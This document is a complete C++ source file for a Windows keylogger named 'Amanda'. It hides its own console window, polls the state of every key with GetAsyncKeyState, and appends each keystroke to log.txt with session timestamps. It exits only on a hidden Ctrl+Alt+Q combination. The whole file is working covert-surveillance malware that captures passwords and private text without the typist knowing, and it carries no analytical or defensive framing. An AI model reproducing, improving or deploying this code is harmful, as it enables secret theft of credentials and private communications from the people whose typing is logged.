#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <ctime>

using namespace std;

// Global flag for graceful exit
bool isRunning = true;

// Get current timestamp
string getTimestamp()
{
    time_t now = time(0);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    return string(timestamp);
}

void startLogging()
{
    // Open log file once at the start
    ofstream log;
    log.open("log.txt", ios::app);

    // Check if file opened successfully
    if (!log.is_open())
    {
        MessageBox(NULL, "Error: Could not open log file!", "Amanda Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Write session start marker with timestamp
    log << "\n\n=== Session started: " << getTimestamp() << " ===\n";
    log.flush();

    char c;
    while (isRunning)
    {
        // Check for exit combination (Ctrl + Shift + ESC already opens Task Manager)
        // Use Ctrl + Alt + Q as graceful exit
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
            (GetAsyncKeyState(VK_MENU) & 0x8000) &&
            (GetAsyncKeyState('Q') & 0x8000))
        {
            isRunning = false;
            break;
        }

        for (c = 0; c <= 254; c++)
        {
            if (GetAsyncKeyState(c) & 0x1)
            {
                // Write to log with error checking
                switch (c)
                {
                case VK_BACK:
                    log << "[BACKSPACE]";
                    break;
                case VK_RETURN:
                    log << "[ENTER]\n";
                    break;
                case VK_SHIFT:
                    log << "[SHIFT]";
                    break;
                case VK_CONTROL:
                    log << "[CONTROL]";
                    break;
                case VK_CAPITAL:
                    log << "[CAP]";
                    break;
                case VK_TAB:
                    log << "[TAB]";
                    break;
                case VK_SPACE:
                    log << " ";
                    break;
                case VK_LEFT:
                    log << "[LEFT]";
                    break;
                case VK_UP:
                    log << "[UP]";
                    break;
                case VK_DOWN:
                    log << "[DOWN]";
                    break;
                case VK_RIGHT:
                    log << "[RIGHT]";
                    break;
                case VK_LWIN:
                    log << "[LWIN]";
                    break;
                case VK_RWIN:
                    log << "[RWIN]";
                    break;
                case VK_ESCAPE:
                    log << "[ESC]";
                    break;
                case VK_MENU:
                    log << "[ALT]";
                    break;
                case VK_LBUTTON:
                case VK_RBUTTON:
                    break;
                default:
                    log << c;
                    break;
                }

                // Flush to ensure data is written
                log.flush();

                // Check if write was successful
                if (log.fail())
                {
                    log.close();
                    MessageBox(NULL, "Error: Failed to write to log file!", "Amanda Error", MB_OK | MB_ICONERROR);
                    return;
                }
            }
        }

        // Small sleep to reduce CPU usage
        Sleep(10);
    }

    // Write session end marker
    log << "\n=== Session ended: " << getTimestamp() << " ===\n";
    log.close();
}

int main()
{
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Test if we can create/write to log file before starting
    ofstream testLog("log.txt", ios::app);
    if (!testLog.is_open())
    {
        MessageBox(NULL, "Error: Cannot create log file! Check permissions.", "Amanda Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    testLog.close();

    // Start logging
    startLogging();

    return 0;
}